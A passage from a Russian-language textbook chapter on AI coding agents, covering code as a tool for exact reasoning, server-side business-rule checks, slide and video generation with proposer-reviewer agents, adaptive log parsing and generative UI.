**Практические рекомендации**. В целом основные Coding-агенты представляют два подхода. Claude Code использует замену старой строки на новую, отдавая приоритет надёжности, простоте реализации и отсутствию дополнительной модели. Cursor довёл подход Apply Model до предела, вкладываясь в обучение и инференс специализированной модели fast-apply ради более высокой пропускной способности редактирования. Для собственного агента наиболее надёжной отправной точкой будет «старая строка в новую строку». При крупных изменениях более экономичный компромисс представляет «сопоставление начала и конца строки». Подход с номерами строк становится надёжным только при глубокой интеграции с IDE, когда редактор в реальном времени поддерживает соответствие номеров строк и немедленно передаёт модели обновлённые данные после каждого изменения. В противном случае он легко нарушается из-за смещения номеров строк.

## Код: метаспособность универсального агента

В предыдущей части было показано, как создать надёжного Coding Agent — от проектирования архитектуры и реализации инструментов до разработки инфраструктуры (harness). Однако ценность генерации кода далеко не ограничивается написанием программ.

> **Что такое «метаспособность»?** Обычная способность позволяет агенту выполнять конкретное действие — отвечать на вопросы, вызывать определённый API или генерировать текст. **Метаспособность** (meta-capability) — это способность «создавать другие способности»: агент с её помощью прямо на месте пишет новые инструменты, ограничения и формы представления для выполнения задачи, не требуя заранее подготавливать весь набор возможностей. Генерация кода — именно такая метаспособность: код точен, исполним и компонуем, поэтому позволяет создавать как новые инструменты (скрипты, последовательности вызовов API), так и новые ограничения (утверждения, правила проверки) и формы представления (HTML-формы, PPT, видеокадры).

Именно поэтому роль кода в системе агентов намного шире простого «написания программ». В следующих шести разделах рассматриваются шесть направлений применения этой метаспособности за пределами программирования: (1) инструмент мышления — использование кода вместо естественного языка для строгих рассуждений; (2) исполнимые ограничения на основе бизнес-правил — закрепление политик в коде во избежание галлюцинаций модели; (3) генерация мультимедиа — создание PPT, видео и визуализаций с помощью кода; (4) системный адаптер — соединение разнородных API с помощью кода; (5) генеративный UI — динамическое создание форм и интерфейсов; (6) самозагрузка — создание новых агентов с помощью кода.

Эти шесть направлений перечислены не параллельно, а организованы изнутри наружу в зависимости от «объекта воздействия метаспособности»:

1. **Само мышление** — замена подверженных ошибкам рассуждений на естественном языке кодом (инструмент мышления);
2. **Бизнес-правила** — преобразование расплывчатых политик в исполнимые ограничения (исполнимые ограничения на основе бизнес-правил);
3. **Представление контента** — создание PPT, видео и визуальных материалов (генерация мультимедиа);
4. **Системные интерфейсы** — соединение разнородных API и автоматическая адаптация к эволюции форматов данных (системный адаптер);
5. **Пользовательский интерфейс** — динамическое создание форм и интерактивных интерфейсов (генеративный UI);
6. **Сам агент** — создание новых агентов с помощью кода и формирование самозагрузки (в отличие от «самоэволюции» без изменения весов из главы 8).

Если следовать этой линии — «изнутри наружу и в конце обратно к самому себе», — становится понятнее единая ценность кода как метаспособности. Дальнейшим развитием этой метаспособности является создание новых инструментов по мере необходимости; это будет подробно рассмотрено в главе 8.

### Код как инструмент мышления

LLM демонстрируют впечатляющие результаты в понимании и генерации естественного языка, но имеют фундаментальные недостатки в точных вычислениях, символьных операциях и строгих логических выводах. Причина в том, что мышление модели по своей природе вероятностно и приблизительно, тогда как математические и логические задачи требуют однозначных и точных ответов. Рассмотрим конкретное сравнение:

```
Задача: «В классе 40 учеников, из них 60% выбрали математику, 45% — физику, а 25% — оба предмета.
         Сколько учеников выбрали только физику, но не математику?»

Рассуждение только на естественном языке       Рассуждение с помощью кода
(легко допустить ошибку):                       (точно и проверяемо):
«60% выбрали математику = 24 человека,          math = int(40 * 0.60)    # 24
 45% выбрали физику = 18 человек,               phys = int(40 * 0.45)    # 18
 25% выбрали оба предмета = 10 человек,         both = int(40 * 0.25)    # 10
 только физику = 24 - 10 = 14 человек»          only_phys = phys - both  # 8
→ Ошибочно вычтено из числа выбравших           → print(only_phys)  # 8 ✓
  математику, ответ неверен
```

Пусть LLM отвечает за понимание задачи и написание кода, а интерпретатор кода — за точные вычисления: такое разделение позволяет каждому выполнять свою работу.

Основатель Mathematica Стивен Вольфрам предложил глубокое понимание этого вопроса. Ещё до появления LLM существовали системы, способные выполнять точные математические вычисления. Они работали посредством **символьных вычислений** (Symbolic Computation), то есть обрабатывали выражения с помощью математических символов, а не приближённых числовых значений. Например, обычный калькулятор вычислит $\sqrt{2}$ как 1,414, тогда как система символьных вычислений сохранит точную форму $\sqrt{2}$ и преобразует её в десятичную дробь только при необходимости. Созданная Вольфрамом система Wolfram Alpha работает именно так: пользователь вводит математический вопрос, а система возвращает точный ответ. Однако понимание естественного языка у неё довольно слабое, а охват узкий: она опирается на встроенный синтаксический анализатор, распознаёт ограниченное число формулировок, может не разобрать вопрос после небольшого изменения формулировки и тем более не способна выполнять многошаговые рассуждения в открытой предметной области. LLM как раз устраняет этот недостаток: она хорошо понимает разнообразные выражения на естественном языке, но плохо справляется с точными вычислениями. Новая модель взаимодействия выглядит так: LLM понимает вопрос пользователя на естественном языке, распознаёт заложенную в нём математическую или логическую структуру и переводит её на формальный язык, например язык Mathematica или библиотеку Python SymPy; затем специализированный движок символьных вычислений или решатель ограничений выполняет код и получает точный результат.

> **Эксперимент 5-1 ★★: повышение качества решения математических задач с помощью инструмента генерации кода**
>
> **Цель эксперимента**: проверить, повышается ли точность математических рассуждений агента при использовании Code Interpreter.
>
> **Техническое решение**: предоставить агенту песочницу Python с установленными математическими библиотеками sympy, numpy, scipy и другими. При получении математической задачи агент формализует её в виде кода Python: sympy используется для символьных вычислений — математического анализа и решения уравнений, scipy — для численной оптимизации, numpy — для матричных операций. Сгенерированный код выполняется в песочнице и возвращает точный результат.
>
> **Критерии приёмки**: провести оценку на задачах в стиле AIME, соответствующих уровню Американского пригласительного математического экзамена. Сравнить точность чистой цепочки рассуждений и рассуждений с помощью кода; режим с кодом должен показывать значительно более высокую точность. Проверить корректность использования математических библиотек и логическую ясность процесса решения.
>

> **Эксперимент 5-2 ★★: повышение качества логических рассуждений с помощью инструмента генерации кода**
>
> **Цель эксперимента**: оценить способность агента использовать код решателя ограничений для логических рассуждений.
>
> **Техническое решение**: предоставить агенту Code Interpreter с библиотекой python-constraint. Агент преобразует логические головоломки, например задачи о рыцарях и лжецах, в формальные определения ограничений: выявляет все переменные — роль каждого островитянина, — а также условия, например следствия из правила «рыцарь говорит правду», определяет ограничения и вызывает решатель для поиска решения, удовлетворяющего всем ограничениям.
>
> **Критерии приёмки**: провести оценку на [наборе задач K&K Puzzle](https://huggingface.co/datasets/K-and-K/perturbed-knights-and-knaves). Точность решения в режиме с кодом должна составить не менее 90% и быть значительно выше, чем в режиме чистых рассуждений.
>

Этот эксперимент также выявляет более общий принцип: возможности модели и сложность инфраструктуры (harness) находятся в обратной зависимости. Если модель достаточно сильна, инфраструктура может быть тоньше: модель сама способна правильно выстроить логику, поэтому дополнительная польза от решателя на основе кода уменьшается. Если модель недостаточно сильна, инфраструктура должна брать на себя больше: критически важные логические рассуждения передаются коду и решателю ограничений, которые обеспечивают корректность. Именно поэтому в этом эксперименте намеренно используется более слабая модель, чтобы сделать различие заметнее: слабая модель часто ошибается в режиме чистых рассуждений, тогда как помощь кода значительно повышает точность. При использовании достаточно сильной рассуждающей модели все головоломки зачастую решаются и без кода, поэтому прирост от него стремится к нулю. Следовательно, необходимая толщина инфраструктуры зависит от границ возможностей имеющейся модели. Это важная предпосылка, которую легко упустить при оценке технологии агентов: одна и та же инфраструктура в сочетании с моделями разной мощности может привести к совершенно разным выводам.

### Код как исполнимое ограничение на основе бизнес-правил

Этот раздел напрямую продолжает тему разработки Harness. Один из основных принципов Harness — «ограничения следует кодировать, а не документировать»: правила преобразуются из документов на естественном языке в исполнимый код и становятся обязательными ограничениями поведения системы, а не рекомендательными указаниями. Генерация кода позволяет агенту самостоятельно выполнять такое преобразование.

Бизнес-правила, рабочие процессы и логика принятия решений, описанные только на естественном языке, часто содержат множество неоднозначностей. Что такое «обоснованный запрос на возврат»? Что считается «экстренной ситуацией»? Границы таких понятий трудно определить естественным языком. Формулировка «возврат возможен в течение 7 дней после покупки» кажется ясной, но «7 дней» — календарные или рабочие? «Покупка» — это момент оформления заказа или отправки товара? Код, напротив, предоставляет однозначный и исполнимый способ представления знаний: он либо успешно выполняется, либо выдаёт ошибку, не оставляя места неопределённости.

**Точное выражение сложных бизнес-правил.**

**Правила на естественном языке и правила в коде: дополнение, а не замена**

Преимущества правил в системном промпте: модель может **объяснять политику** пользователю; может **искать альтернативные варианты** на основе правил, например «изменить бронирование вместо отмены»; может предварительно оценить выполнимость перед вызовом инструмента.

Преимущества правил, закодированных в инструменте проверки: **точность и однозначность** логики кода — исключается «ошибка понимания»; **детерминированность** выполнения — одинаковые входные данные всегда дают одинаковый результат; особенно удобная обработка **сложных сочетаний правил** — булевых комбинаций множества условий, расчётов времени и проверок по нескольким источникам данных.

На практике эти подходы следует сочетать: системный промпт содержит правила на естественном языке для понимания и коммуникации, а ключевые точки принятия решений защищаются инструментами проверки с правилами в коде, которые действуют как «контролёры» и обеспечивают соблюдение требований.

Подлинная ценность правил в коде состоит не в оптимизации расхода токенов, а в **предотвращении необратимых ошибочных операций**: отмены заказа, перевода средств или удаления данных. После выполнения такие операции нельзя отменить. Проверка в коде создаёт последний рубеж защиты перед операцией, и ценность этой гарантии безопасности значительно превосходит стоимость реализации.

**Объединение проверки и выполнения: checklist направляет рассуждение, а проверка достоверных данных контролирует операцию**

Вместо отдельного инструмента проверки лучше встроить проверку непосредственно в инструмент выполнения. Рассмотрим политику отмены авиабронирования из τ-bench — бенчмарка, моделирующего обслуживание клиентов авиакомпаний и интернет-магазинов и специально оценивающего соблюдение политик и качество вызовов инструментов агентами:

```python
def cancel_reservation(
    reservation_id: str,
    cancellation_reason: str,        # "change_of_plan", "airline_cancelled", "other"
    expected_cabin_class: str = None,    # Необязательно: для самопроверки модели; сервер сверяет с истинными данными БД
    expected_has_insurance: bool = None  # Необязательно: для самопроверки модели; аналогично
) -> dict:
    """
    Отменяет бронирование авиарейса.

    Политика отмены принудительно применяется сервером на основе достоверных данных БД:
    - Правило 1: бронирование нельзя отменить, если использован хотя бы один сегмент маршрута
    - Правило 2: в течение 24 часов после бронирования отмена возможна без дополнительных условий
    - Правило 3: рейс, отменённый авиакомпанией, всегда можно отменить
    - Правило 4: бизнес-класс всегда можно отменить
    - Правило 5: для отмены бронирования в базовом экономическом и экономическом классе нужна туристическая страховка

    Перед вызовом сначала запросите сведения о бронировании и последовательно проверьте
    перечисленные правила; параметры expected_* описывают основания вашего решения
    и используются только для серверного сопоставления и аудита, не влияя на решение по политике.
    """
    # Все факты, относящиеся к политике, считываются только из БД; заявленные моделью значения не считаются достоверными
    r = db.get_reservation(reservation_id)
    now = server_clock.now()  # Серверные часы, а не предоставленное моделью время

    # Несоответствие заявленного моделью значения истинному записывается в журнал для выявления ошибок модели и возможных инъекций
    if expected_cabin_class is not None and expected_cabin_class != r.cabin_class:
        log_mismatch(reservation_id, "cabin_class", expected_cabin_class, r.cabin_class)
    if expected_has_insurance is not None and expected_has_insurance != r.has_insurance:
        log_mismatch(reservation_id, "has_insurance", expected_has_insurance, r.has_insurance)

    if r.any_segment_used:
        return {"success": False, "reason": "Cannot cancel with used segments"}

    hours_since_booking = (now - r.booking_time).total_seconds() / 3600
    if hours_since_booking <= 24:
        execute_cancellation(reservation_id)
        return {"success": True, "reason": "Cancelled within 24-hour window"}

    if r.flight_status == "cancelled_by_airline":
        execute_cancellation(reservation_id)
        return {"success": True, "reason": "Airline cancelled flight"}

    if r.cabin_class == "business":
        execute_cancellation(reservation_id)
        return {"success": True, "reason": "Business class cancellation"}

    if r.cabin_class in ["basic_economy", "economy"]:
        if r.has_insurance:
            execute_cancellation(reservation_id)
            return {"success": True, "reason": f"{r.cabin_class} with insurance"}
        return {"success": False, "reason": f"{r.cabin_class} requires insurance"}

    return {"success": False, "reason": "Does not meet cancellation policy"}
```

Ценность этой архитектуры следует рассматривать на двух уровнях.

**Первый уровень: параметры как checklist для рассуждений**. В описании инструмента перечислена полная политика отмены и содержится требование «перед вызовом сначала запросить сведения о бронировании и последовательно проверить все правила». Необязательные параметры `expected_*` дополнительно побуждают модель явно указывать основания своего решения. Чтобы правильно заполнить эти параметры, модель должна сначала вызвать инструмент получения сведений о бронировании и по очереди проверить каждое условие. Процесс заполнения параметров по сути представляет собой **обязательный checklist**. Если модель обнаружит, что билет относится к экономическому классу, а страховка не приобретена, она, скорее всего, заметит правило 5 ещё при подготовке вызова и **вообще не станет вызывать инструмент**, а сразу сообщит пользователю: «Билет экономического класса без страховки отменить нельзя; можно приобрести страховку и затем выполнить отмену либо изменить бронирование». Ценность этого уровня — направление рассуждений и сокращение числа бесполезных вызовов. Однако он не отвечает за безопасность: параметры `expected_*` — лишь заявления модели о собственном понимании, и сервер никогда не принимает их за факты.

**Второй уровень: настоящим контролёром является серверная проверка достоверных данных**. Обратите внимание на ключевой принцип кода: класс обслуживания, наличие страховки, время бронирования, использование сегментов маршрута и состояние рейса сервер получает из базы данных; текущее время берётся с серверных часов. **Ни один факт, относящийся к политике, не поступает из заявленных моделью параметров**. Такая осторожность не избыточна: модель может галлюцинировать или подвергнуться манипуляции посредством инъекции в промпт. Как отмечалось ранее при разборе «трёх смертельных факторов», агенту, работающему в едином контексте, трудно самостоятельно доказать, что он не скомпрометирован. Если сделать `cabin_class`, `has_insurance` или даже `current_time` параметрами, которые заполняет модель, достаточно ошибочно указать — или под влиянием злоумышленника исказить — одно значение, и «контролёр» станет бесполезен. Последний рубеж защиты должен основываться на данных, которые модель не способна подделать. Это соответствует сформулированной ранее позиции о необходимости независимой проверки критических операций: независимость относится не только к модели, но и к источнику данных.

Таким образом формируется тройная защита: (1) правила на естественном языке в системном промпте помогают понимать и объяснять политику; (2) описание инструмента и параметры действуют как checklist, направляя модель на явную проверку условий перед вызовом; (3) проверка в коде на основе достоверных данных базы на стороне сервера становится последним контролёром. Первые два уровня уменьшают вероятность ошибки, третий гарантирует, что ошибка не превратится в необратимый ущерб.

> **Эксперимент 5-3 ★★: повышение точности соблюдения правил небольшой моделью с помощью знаний, закодированных в программе**
>
> **Цель эксперимента**: проверить, способно ли кодирование бизнес-правил значительно повысить точность и согласованность выполнения сложных политик небольшой моделью Qwen3-4B.
>
> **Техническое решение**: провести контролируемый эксперимент на сценарии обслуживания клиентов авиакомпании из τ-bench. **Контрольная группа**: правила только на естественном языке, модель полагается на собственные рассуждения. **Экспериментальная группа**: тройная защита — правила на естественном языке сохраняются в системном промпте; описание инструмента содержит полную политику, а необязательные параметры `expected_*` направляют модель на последовательную проверку условий перед вызовом (checklist); внутри инструмента выполняется проверка в коде на основе достоверных данных имитированной базы данных — все факты политики запрашиваются из БД, время берётся с серверных часов, а заявленным моделью параметрам доверять запрещено. Метрики оценки: доля успешно выполненных задач, число нарушений политики, число бесполезных вызовов инструментов и пользовательский опыт.
>
> **Ожидаемый результат**: экспериментальная группа значительно превосходит контрольную. Особенно важно зафиксировать, что модель самостоятельно распознаёт недопустимую операцию ещё при подготовке параметров и сразу предлагает пользователю альтернативу, подтверждая эффективность «параметров как checklist». Одновременно следует измерить долю расхождений между заявленными значениями `expected_*` и достоверными данными БД, чтобы подтвердить необходимость «серверной проверки достоверных данных» для блокировки ошибочных представлений.
>
### Генерация мультимедиа с помощью кода

Создание многих сложных документов по своей сути представляет собой организацию и представление структурированных данных. Презентации, технические отчёты и интерактивные приложения на нижнем уровне определяются кодом: HTML описывает структуру, CSS управляет стилями, JavaScript реализует интерактивность. Традиционное создание документов опирается на визуальное редактирование в GUI по принципу WYSIWYG, но для агента оно неинтуитивно и неэффективно, поскольку операции в GUI требуют визуального понимания и точного определения координат. Благодаря генерации кода агент обходит проблему визуального позиционирования и получает точный контроль над документом: положение, стиль и содержимое каждого элемента заданы явно и могут изменяться и оптимизироваться программно.

**Агент для создания PPT.**

Создание PPT часто требует много времени и усилий. Типичная презентация для научного доклада может содержать десятки слайдов, каждый из которых требует тщательно продуманной компоновки, выделения основных тезисов и подбора диаграмм. Если переосмыслить создание PPT как задачу генерации кода, сложность можно значительно снизить. Современные фреймворки для PPT, такие как Slidev, используют элегантную концепцию: содержимое презентации задаётся с помощью Markdown и HTML. Для создания слайда достаточно написать компактную разметку, после чего фреймворк автоматически выполняет рендеринг, компоновку и анимацию. Такой подход исключительно удобен для агента, умеющего генерировать код.

![Рисунок 5-5. Механизм «предлагающий — проверяющий» для создания PPT](images/fig5-5.svg)


Одной генерации кода недостаточно. **После написания кода агент не знает, как выглядит фактический результат рендеринга**: не слишком ли плотно расположено содержимое, не выходит ли текст за границы, правильно ли подобран размер изображений. Обнаружить это можно только после реального рендеринга. Поэтому необходимо использовать механизм **«предлагающий — проверяющий»** (Proposer-Reviewer), показанный на рисунке 5-5, разделив написание кода и оценку качества между двумя независимыми агентами:

- **Proposer Agent** генерирует код Slidev, понимает логическую структуру материала и разбивает его на подходящие слайды
- **Reviewer Agent** выполняет код и рендерит каждый слайд в изображение, после чего Vision LLM — мультимодальная большая языковая модель, способная «понимать» изображения, — анализирует результат по таким параметрам, как плотность содержимого, читаемость, обоснованность компоновки и визуальная привлекательность, а затем формирует **структурированные рекомендации по улучшению**. Это не расплывчатая оценка «выглядит плохо», а конкретные исполнимые указания, например: «Слайд 3: слишком много содержимого, рекомендуется разделить» или «Слайд 7: шрифт в блоке кода слишком мелкий, рекомендуется увеличить до 14pt». Рекомендации содержат номер слайда, тип проблемы, степень серьёзности и другие поля

Получив обратную связь, Proposer понимает её смысл и изменяет код. Новая версия снова передаётся Reviewer для проверки. Итерации продолжаются до достижения требуемого качества или максимального числа раундов, например пяти.

Итерационный цикл «предлагающий — проверяющий» в этой главе имеет общее происхождение с **предварительным согласованием** из главы 4: оба являются примерами одной парадигмы, где генерация отделена от проверки, а оценку независимо выполняет вторая модель. Различаются их цели и формы. В главе 4 этот подход применяется для проверки безопасности необратимых операций, и проверяющий одобряет или отклоняет отдельную операцию. В этой главе он используется для итеративного повышения качества контента: цикл выполняется многократно, а проверяющий получает новую информацию, недоступную предлагающему, — результат рендеринга. Основные принципы архитектуры остаются теми же: общие целевые ограничения, использование разных семейств моделей для снижения вероятности однотипных ошибок и добавление обратной связи в траекторию Proposer как специального события. **Главное преимущество разделения между двумя агентами вместо цикла внутри одного агента заключается в управлении контекстом**: Reviewer каждый раз обрабатывает только изображения последней версии и не отвлекается на предыдущие варианты; Proposer накапливает лишь структурированную текстовую обратную связь, которая расходует мало токенов и упрощает рассуждения. При использовании одного агента изображения десятков слайдов накапливались бы в одном контексте на протяжении множества итераций, быстро исчерпывая его предел. Этот механизм будет повторно использоваться в последующих экспериментах с монтажом видео и визуализацией журналов. В главе 10 будут рассмотрены другие схемы взаимодействия нескольких агентов помимо парадигмы «предлагающий — проверяющий».

> **Эксперимент 5-4 ★★: автоматическое создание PPT на основе научной статьи**
>
> **Цель эксперимента**: автоматически создать качественную презентацию из научной статьи и проверить эффективность механизма «предлагающий — проверяющий» для контроля качества контента.
>
> **Техническое решение**: использовать фреймворк Slidev. Proposer Agent читает PDF научной статьи, извлекает структуру разделов, основные положения и диаграммы, планирует структуру PPT и генерирует код Slidev для каждого слайда. **Ключевой этап**: Reviewer Agent рендерит снимок каждого слайда и с помощью Vision LLM проверяет результат, выявляя выход текста за границы, перегруженность содержимым, неподходящие размеры изображений и другие проблемы, после чего формирует структурированные рекомендации по улучшению. Итерации продолжаются до достижения требуемого результата.
>
> **Критерии приёмки**: создать PPT из 10–20 слайдов, охватывающих основные достижения статьи. Использовать не менее трёх исходных графиков или схем, согласованных с текстовыми пояснениями. После рендеринга текст не должен выходить за границы, а компоновка должна быть обоснованной. Сравнить один агент с самопроверкой и разделение «предлагающий — проверяющий» по расходу контекста и качеству результата.
>

> **Эксперимент 5-5 ★★: автоматическое создание видеолекции по научной статье**
>
> **Цель эксперимента**: расширить возможности создания PPT, объединив визуальный и аудиальный каналы для автоматического создания видеолекции.
>
> **Техническое решение**: на основе процесса создания PPT из эксперимента 5-4 агент одновременно генерирует разговорный текст объяснения для каждого слайда — направляющее повествование, а не пересказ, — вызывает TTS для синтеза речи и с помощью ffmpeg синхронно объединяет снимки слайдов и аудио в видео.
>
> **Критерии приёмки**: продолжительность видео составляет 5–15 минут, время показа каждого слайда точно соответствует длительности речи, а объяснение согласовано с визуальными элементами.
>

**Агент для монтажа видео.**

Использование универсального Computer Use для монтажа видео сталкивается с фундаментальной проблемой: GUI видеоредакторов чрезвычайно сложен и содержит множество временных шкал, слоёв и панелей эффектов. Агент должен точно находить эти элементы интерфейса и управлять монтажом с помощью мыши и клавиатуры, а точное определение координат представляет серьёзную трудность.

Если переосмыслить монтаж видео как задачу вызова API и генерации кода, сложность существенно снижается. Многие профессиональные программы предоставляют программные API, раскрывающие основные функции в структурированной и компонуемой форме. Например, Blender — это открытый инструмент для 3D-творчества и видеокомпозитинга с поддержкой управления через скрипты Python, а FFmpeg — универсальный инструмент командной строки для обработки аудио и видео. Blender Python API позволяет с помощью кода точно управлять импортом, обрезкой и расположением видеофрагментов, переходами, сведением аудио и другими операциями, причём каждой операции соответствует понятный вызов функции. Для агента преобразовать требования на естественном языке в вызовы API гораздо проще, чем понимать GUI и имитировать щелчки мыши. Как и при создании PPT, для монтажа видео используется механизм «предлагающий — проверяющий»: Proposer Agent генерирует скрипт Blender, а Reviewer Agent рендерит ключевые кадры, проверяет их с помощью Vision LLM и возвращает рекомендации по исправлению.

> **Эксперимент 5-6 ★★: интеллектуальный монтаж видео на основе API**
>
> **Цель эксперимента**: проверить способность агента выполнять монтаж видео посредством генерации кода Blender Python API и оценить роль механизма «предлагающий — проверяющий» с визуальной обратной связью при обработке мультимедийного контента.
>
> **Основная сложность**: понять описанные пользователем на естественном языке требования к монтажу и преобразовать их в точную последовательность вызовов API, обработать различные монтажные операции — обрезку, объединение, субтитры, сведение звуковых дорожек и визуальные эффекты, — а также обеспечить корректное выполнение сгенерированного скрипта Python. После написания кода Proposer Agent не может напрямую оценить результат видео, поэтому Reviewer Agent должен выполнить рендеринг и проверить ключевые кадры с помощью Vision LLM.
>
> **Техническое решение**: пользователь предоставляет видеоматериалы, например исходные записи с сёрфингом, пешим походом и катанием на лыжах, и описывает требования на естественном языке, например «вырежи фрагмент с сёрфингом». Proposer Agent через дочернего агента для анализа видео использует **двухэтапную стратегию локализации**:
>
> **Первый этап — грубая локализация**: дочерний агент получает путь к видео, интервал создания кадров в 10 секунд и целевой вопрос. С помощью ffmpeg он извлекает ключевые кадры, передаёт все изображения вместе с вопросом в Vision LLM и возвращает временной диапазон сцены, например «сёрфинг находится между 40-й и 110-й секундами».
>
> **Второй этап — точная локализация**: дочерний агент вызывается повторно для более узкого диапазона с частотой один кадр в секунду и точно определяет временные границы.
>
> Инкапсуляция анализа видео в дочернем агенте предотвращает заполнение контекста основного агента множеством кадров. После локализации генерируется скрипт Blender API. Reviewer Agent выполняет быстрый предварительный рендеринг, проверяет ключевые кадры и возвращает рекомендации. Итерации продолжаются до достижения требуемого качества, после чего запускается полный рендеринг.
>
> **Критерии приёмки**: агент должен точно распознавать различные сцены в видео и правильно генерировать монтажный скрипт на основе инструкций на естественном языке. Начальная и конечная точки должны определяться с погрешностью не более трёх секунд. Если инструкция содержит требования к эффектам — замедлению, переходам или субтитрам, — эффекты должны быть правильно применены в созданном видео. Reviewer Agent должен обнаруживать очевидные ошибки — пропущенное важное содержимое или наличие посторонних фрагментов — и инициировать исправление. Итоговый видеофайл должен иметь корректный формат и ожидаемое качество изображения.
>
### Код как системный адаптер

В предыдущих разделах код в основном создавал нечто «для человека»: отчёты, презентации и интерфейсы. Здесь он используется в другом направлении — **для соединения машин с машинами**. Во внешних сервисах, с которыми агент взаимодействует в реальных системах, часто отсутствует готовый SDK, а интерфейсы не всегда стандартизированы: документация может отсутствовать, формат ответа может быть нестандартным, а поля — меняться от версии к версии. В таких условиях агенту необязательно ждать, пока человек заранее напишет слой адаптации. Он может на месте прочитать документацию интерфейса или изучить один-два реальных ответа и сразу сгенерировать адаптационный код: создать HTTP-клиент, сформировать заголовки аутентификации, разобрать нестандартную структуру ответа и преобразовать модель данных вышестоящей системы в форму, которую способна принять нижестоящая. Здесь код становится «универсальным клеем» для соединения произвольных систем: если компоненты не стыкуются, агент прямо на месте генерирует фрагмент связующего кода. В этом заключается сущность направления метаспособности «системные интерфейсы». Рассматриваемый далее адаптивный разбор журналов — конкретное проявление этой возможности в сценариях наблюдаемости: сталкиваясь с постоянно изменяющимися форматами журналов, агент аналогичным образом адаптируется, генерируя код разбора на месте.

Этот «универсальный клей» можно применять даже к **системам без API**. Если внешняя система предоставляет только графический интерфейс, агент может сначала выполнить операцию через Computer Use, который подробно рассматривается в главе 9, а затем закрепить успешно выполненную последовательность действий в коде как инструмент RPA. При повторном выполнении той же задачи в будущем достаточно напрямую запустить код, обеспечив высокую скорость и стабильность без дорогостоящих визуальных рассуждений. Можно сказать, что RPA — крайняя форма «системного адаптера» для систем без API. Механизм «записи и закрепления рабочего процесса» будет рассмотрен в главе 8.

Обработка данных — одна из самых распространённых и одновременно неприятных задач в программных системах. Её первопричина заключается в разнообразии и постоянном изменении форматов данных. В процессе развития одна система может неоднократно менять формат: добавлять новые поля, изменять вложенную структуру, вводить новые типы. Написание отдельного кода разбора для каждого формата требует значительных затрат на сопровождение: при каждом изменении приходится обновлять логику, проверять совместимость и развёртывать новую версию.

Генерация кода предлагает принципиально новый подход: при появлении нового формата агент временно генерирует код разбора на основе образца данных, а система автоматически адаптируется к эволюции формата без вмешательства человека.

**Разбор и визуализация журналов агента.**

Наблюдаемость системы агентов зависит от визуализации процесса выполнения. Сложная задача агента может включать сотни шагов, множество вызовов LLM, десятки запусков инструментов и взаимодействия нескольких дочерних агентов. Визуализация этих данных сталкивается с несколькими трудностями: разные инструменты возвращают данные разной структуры, формат постоянно развивается вместе с системой, а полная траектория может содержать сотни тысяч символов, поэтому необходимо найти баланс между обзором и подробностями.

Генерация кода предлагает элегантное решение — самовосстанавливающийся цикл обратной связи. Если фронтенд сталкивается с форматом журнала, который не может разобрать, он не просто показывает ошибку, а автоматически передаёт агенту сведения о сбое: исходный образец журнала и подробное сообщение об ошибке. Агент анализирует структуру образца и генерирует фронтенд-код, способный правильно его разобрать. Сначала код автоматически тестируется в виртуальном браузере: проверяется правильность разбора, а Vision LLM оценивает результат визуализации. После успешной проверки код развёртывается во фронтенд-системе посредством горячего обновления.

> **Эксперимент 5-7 ★★★: адаптивная система разбора журналов**
>
> **Цель эксперимента**: создать способную к самоэволюции систему визуализации журналов агента.
>
> **Техническое решение**: изначально система поддерживает только базовый формат. Фронтенд обнаруживает ошибку разбора → сообщает агенту → генерируется код разбора → выполняется тестирование в виртуальном браузере → развёртывается горячее обновление. Весь процесс автоматизирован.
>
> **Критерии приёмки**: система автоматически обнаруживает сбой и инициирует обучение, сгенерированный код проходит автоматические тесты, а после горячего обновления новый формат разбирается правильно.
>

**Автоматический анализ журналов выполнения агента и диагностика проблем.**

Агенты в продукционной среде создают большое количество журналов траекторий (trajectory), содержащих полный процесс выполнения каждой задачи. Однако выявление проблем, определение первопричин и создание тестовых сценариев по этим журналам требуют значительных затрат. Локализация проблемы затруднена, поскольку сбой задачи может быть вызван совместными ошибками нескольких модулей. Воспроизведение обходится дорого, потому что сложность продукционной среды трудно имитировать в тестовой. Исправленные проблемы легко возникают повторно из-за отсутствия систематических регрессионных тестов.

Генерация кода создаёт путь к автоматизации диагностики. Агент может читать продукционные журналы и, сопоставляя их с архитектурной документацией и PRD — документом с требованиями к продукту, — автоматически определять, соответствует ли процесс выполнения ожиданиям, а также находить проблемный этап и модуль. На основании анализа создаются структурированный отчёт о проблеме — приоритет, модуль, описание и рекомендации по улучшению — и регрессионный тест. Тест ссылается на ID проблемной траектории и ключевые раунды взаимодействия, а тестовый фреймворк автоматически воспроизводит их, проверяя, способна ли исправленная система при тех же входных данных вести себя правильно. Наконец, агент через MCP подключается к GitHub, создаёт Issue и назначает его соответствующему разработчику, полностью автоматизируя путь от обнаружения проблемы до назначения задачи.

> **Эксперимент 5-8 ★★★: интеллектуальная система диагностики продукционных журналов**
>
> **Цель эксперимента**: автоматически обнаруживать проблемы в продукционных траекториях, создавать тестовые сценарии и рабочие задачи.
>
> **Техническое решение**: агент читает набор траекторий из продукционной среды и анализирует их вместе с архитектурной документацией и PRD: выявляет шаблоны проблем и определяет затронутые модули. Затем он создаёт структурированный отчёт о проблеме — приоритет, модуль, описание и рекомендации по улучшению. Автоматически генерируется регрессионный тест, который ссылается на ID траектории и раунды взаимодействия и воспроизводится тестовым фреймворком для проверки. Через MCP агент подключается к GitHub и автоматически создаёт Issue.

### Код как генеративный UI

Традиционные системы агентов взаимодействуют с пользователями преимущественно через текстовый диалог. Однако текст как линейный и однообразный способ взаимодействия во многих сценариях неэффективен. При сборе структурированной информации многократные вопросы и ответы делают диалог затянутым. При представлении сложных связей между данными выразительные возможности чистого текста ограничены. Когда пользователю нужно выбрать один из нескольких вариантов, текстовый список гораздо менее нагляден, чем визуальный интерфейс.

Генерация кода позволяет преодолеть эти ограничения: агент может динамически создавать формы, интерактивные диаграммы и даже полноценные веб-приложения, превращая статический текстовый диалог в насыщенное мультимодальное взаимодействие. Такая модель, при которой агент динамически создаёт интерфейс, называется **генеративным UI** (Generative UI).

**Протоколы класса A2UI: стандартизация генеративного UI.**

